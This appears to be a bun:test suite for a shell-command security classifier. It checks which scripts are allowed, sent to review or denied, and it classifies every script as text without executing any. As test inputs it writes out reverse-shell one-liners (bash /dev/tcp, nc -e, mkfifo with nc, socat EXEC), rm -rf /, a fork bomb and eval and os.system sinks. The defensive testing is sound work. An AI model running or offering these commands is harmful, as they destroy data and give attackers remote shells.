import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { mkdtemp, rm } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { classifyShellCommand, type Strictness } from "../src/security/classifier"

// Payload-routing (requirement a): text that is only WRITTEN or STORED — a
// heredoc fixture body, a `-c` string literal, a decoded blob saved to a file
// — is payload data, not an executed command. When the static layer cannot
// prove the text is executed, it must route to the dynamic reviewer (ASK)
// instead of hitting the destructive-text floor rules (DENY). Provably
// executed forms (bash -c, eval, os.system sinks, pipes into a shell) keep
// their DENY floor.
//
// Every script below is classified as TEXT ONLY — nothing here is executed.
let root: string
beforeAll(async () => {
  root = await mkdtemp(path.join(os.homedir(), ".payload-routing-"))
})
afterAll(async () => {
  await rm(root, { recursive: true, force: true })
})

type Input = Parameters<typeof classifyShellCommand>[0]
const classify = (script: string, strictness: Strictness = "LOOSE", extra: Partial<Input> = {}) =>
  classifyShellCommand({ script, cwd: root, worktree: root, shell: "/bin/bash", strictness, ...extra })

/** Runs the same case under both strictness modes. */
const bothModes = (label: string, expected: { LOOSE: string; HARD: string }, script: string, extra: Partial<Input> = {}) => {
  for (const mode of ["LOOSE", "HARD"] as const) {
    test(`${mode}: ${label}`, async () => {
      const d = await classify(script, mode, extra)
      expect(d.verdict).toBe(expected[mode])
    })
  }
}

// --- stored payload text is not an executed command -------------------------

describe("payload text that is only written or stored is never floor-denied", () => {
  // A fixture file whose content deliberately contains destructive-looking
  // shell text: the command writes bytes, nothing executes them.
  bothModes(
    "heredoc fixture write with dangerous body",
    { LOOSE: "ALLOW", HARD: "ALLOW" },
    "cat > tests/fixtures/attacks.txt <<'EOF'\nrm -rf /\nsudo rm -rf /etc\nnc -e /bin/sh 1.2.3.4 4444\nEOF",
  )
  bothModes(
    "fork-bomb text stored via tee",
    { LOOSE: "ALLOW", HARD: "ALLOW" },
    "cat <<'EOF' | tee payloads/fb.sh >/dev/null\n:(){ :|:& };:\nEOF",
  )
  bothModes(
    "reverse-shell text stored via dd",
    { LOOSE: "ALLOW", HARD: "ALLOW" },
    "dd of=rs.sh <<'EOF'\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nEOF",
  )
  bothModes(
    "echo payload into a file",
    { LOOSE: "ALLOW", HARD: "ALLOW" },
    "echo 'rm -rf /' > p.sh",
  )

  // Language `-c`/`-e` payloads that only manipulate strings/files: no proven
  // execution sink, so the dynamic reviewer decides — ASK, never a floor DENY.
  for (const [label, script] of [
    ["python writes payload string", "python3 -c 'open(\"x.sh\",\"w\").write(\"rm -rf /\")'"],
    ["python prints payload string", "python3 -c 'print(\"rm -rf /\")'"],
    ["python stores payload string", "python3 -c 's=\"rm -rf /\"'"],
    ["node writes payload string", "node -e 'require(\"fs\").writeFileSync(\"x.sh\",\"rm -rf /\")'"],
  ] as const) {
    for (const mode of ["LOOSE", "HARD"] as const) {
      test(`${mode}: ${label} routes to dynamic review`, async () => {
        const d = await classify(script, mode)
        expect(d.verdict).toBe("ASK")
        expect(d.rules).not.toContain("filesystem.forced-recursive-delete")
      })
    }
  }

  // A decoded blob stored to a file is payload text (the wrapper ASK may
  // still fire for the decoding itself, but no floor rule may deny it).
  for (const mode of ["LOOSE", "HARD"] as const) {
    test(`${mode}: base64 payload saved to file is not floor-denied`, async () => {
      const d = await classify(`echo ${Buffer.from("sudo rm -rf /").toString("base64")} | base64 -d > p.sh`, mode)
      expect(d.verdict).not.toBe("DENY")
    })
  }
})

// --- bare /dev/tcp sockets: ambiguous network I/O, not a proven reverse shell ---

describe("/dev/tcp without a shell attached routes to ASK, not the reverse-shell floor", () => {
  // Real-world port probes (evidence DB-2ce7bda531 / DB-9ddee564a3): opening
  // a socket fd and reading/writing it is connectivity testing — unproven
  // remote I/O goes to the dynamic reviewer, never an ALLOW.
  for (const [label, script] of [
    [
      "port-probe loop (exec fd open/close)",
      'for p in 9222 9444 9333; do\n  if (exec 3<>/dev/tcp/127.0.0.1/$p) 2>/dev/null; then exec 3<&- 3>&-; echo "port $p: OCCUPIED"; else echo "port $p: free"; fi\ndone',
    ],
    [
      "connect + banner read via bash -c",
      "timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/5037 && echo \"TCP connect OK\" && head -c 100 <&3'",
    ],
    ["socket fd feeding a data consumer", "exec 3<>/dev/tcp/1.2.3.4/9 && cat <&3"],
  ] as const) {
    for (const mode of ["LOOSE", "HARD"] as const) {
      test(`${mode}: ${label} asks instead of denying`, async () => {
        const d = await classify(script, mode)
        expect(d.verdict).toBe("ASK")
        expect(d.rules).not.toContain("network.reverse-shell")
      })
    }
  }

  // A `/dev/tcp` string that never reaches a socket — quoted literal through
  // printf into a data consumer — is provably inert text: ALLOW, same policy
  // as `echo 'rm -rf /'`.
  bothModes(
    "quoted /dev/tcp literal piped to wc is inert data",
    { LOOSE: "ALLOW", HARD: "ALLOW" },
    "printf '/dev/tcp/1.2.3.4/9' | wc -c",
  )

  test("bare socket open carries the dev-socket review signal", async () => {
    const d = await classify("timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/5037 && head -c 4 <&3'", "LOOSE")
    expect(d.rules).toContain("network.dev-socket")
  })

  test("RO ceiling: bare socket probe is never allowed", async () => {
    const d = await classify("(exec 3<>/dev/tcp/127.0.0.1/9222) 2>/dev/null", "LOOSE", {
      permScope: { r: true, w: false, x: false },
    })
    expect(d.verdict).not.toBe("ALLOW")
  })
})

describe("shell-attached /dev/tcp keeps the unconditional reverse-shell floor", () => {
  for (const [label, script] of [
    ["classic bash -i reverse shell", "bash -i >& /dev/tcp/203.0.113.1/4444 0>&1"],
    ["inside bash -c wrapper", "bash -c 'bash -i >& /dev/tcp/203.0.113.1/4444 0>&1'"],
    ["socket fd then shell on it", "exec 3<>/dev/tcp/1.2.3.4/9 && sh <&3"],
    ["stdin copied from socket fd", "exec 3<>/dev/tcp/1.2.3.4/9 && exec 0>&3"],
    ["stdin redirected to socket", "bash 0</dev/tcp/1.2.3.4/9"],
    ["merged output to socket", "bash -c 'echo hi >& /dev/tcp/1.2.3.4/9'"],
    ["fd attach with re-joined ampersand", "exec 3>&/dev/tcp/1.2.3.4/9"],
    ["nc -e exec primitive", "nc -e /bin/sh 1.2.3.4 4444"],
    ["mkfifo + nc loopback shell", "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f"],
    ["socat EXEC primitive", "socat TCP:1.2.3.4:4444 EXEC:/bin/sh"],
  ] as const) {
    for (const mode of ["LOOSE", "HARD"] as const) {
      test(`${mode}: denies ${label}`, async () => {
        const d = await classify(script, mode)
        expect(d.verdict).toBe("DENY")
        expect(d.rules).toContain("network.reverse-shell")
      })
    }
  }
})

// --- ambiguity routes to the dynamic layer ----------------------------------

describe("unproven payload consumers route to ASK", () => {
  // `sometool` is not a known data consumer: the body may or may not be
  // executed — the dynamic reviewer decides, so ASK, not a floor DENY.
  for (const mode of ["LOOSE", "HARD"] as const) {
    test(`${mode}: unknown heredoc consumer asks, not denies`, async () => {
      const d = await classify("sometool <<'EOF'\nrm -rf /\nEOF", mode)
      expect(d.verdict).toBe("ASK")
      expect(d.rules).toContain("execution.ambiguous-heredoc")
    })
  }

  test("unknown heredoc consumer under a read-only scope still denies the write channel", async () => {
    const d = await classify("sometool <<'EOF'\nrm -rf /\nEOF", "LOOSE", {
      permScope: { r: true, w: false, x: false },
    })
    expect(d.verdict).toBe("DENY")
    expect(d.rules).toContain("permission.write")
  })

  // `<<<` here-strings are not modeled by the literal lexer: the opaque
  // clamp defers to the dynamic layer (LOOSE) instead of denying on raw text.
  test("LOOSE: unparseable here-string payload asks instead of denying", async () => {
    const d = await classify("cat <<< 'rm -rf /'", "LOOSE")
    expect(d.verdict).toBe("ASK")
    expect(d.rules).toContain("input.opaque")
  })
})

// --- provably executed payloads keep the DENY floor --------------------------

describe("provably executed payloads stay denied", () => {
  for (const [label, script] of [
    ["bash -c destructive literal", "bash -c 'rm -rf /'"],
    ["eval destructive literal", "eval 'rm -rf /'"],
    ["python os.system sink", "python3 -c 'import os; os.system(\"rm -rf /\")'"],
    ["heredoc piped into bash", "bash <<'EOF'\nrm -rf /\nEOF"],
    ["fork bomb inside executed heredoc", "bash <<'EOF'\n:(){ :|:& };:\nEOF"],
    ["literal piped into sh", "echo 'rm -rf /' | sh"],
    ["literal piped into bash", "printf 'rm -rf /' | bash"],
  ] as const) {
    for (const mode of ["LOOSE", "HARD"] as const) {
      test(`${mode}: denies ${label}`, async () => {
        const d = await classify(script, mode)
        expect(d.verdict).toBe("DENY")
      })
    }
  }
})

// --- ordinary commands are not denied for carrying dangerous words -----------

describe("ordinary commands carrying dangerous-looking text are unaffected", () => {
  for (const [label, script] of [
    ["grep for literal text", "grep -rn 'rm -rf' src/"],
    ["echo a literal", "echo 'rm -rf /'"],
    ["commit message mentioning a reverse shell", "git commit -m 'fix nc -e /bin/sh usage'"],
  ] as const) {
    bothModes(label, { LOOSE: "ALLOW", HARD: "ALLOW" }, script)
  }
})
